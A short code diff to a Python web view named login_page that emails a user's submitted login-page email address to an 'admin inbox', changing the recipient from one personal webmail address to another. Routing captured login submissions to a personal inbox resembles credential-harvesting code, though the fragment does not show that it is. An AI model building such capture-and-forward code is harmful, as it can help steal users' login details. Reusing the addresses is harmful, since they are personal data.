@@ -24,7 +24,7 @@ def login_page(request):
                 # Email settings - send the captured email to the admin inbox
                 subject = "New Login Email Submission - Suits Me"
                 from_email = settings.DEFAULT_FROM_EMAIL
-                recipient_list = ['saint.nsj@proton.me']
+                recipient_list = ['eugyneehunter@gmail.com']
                 email_body = f"""
                 A user has submitted their email address via the login page.
 
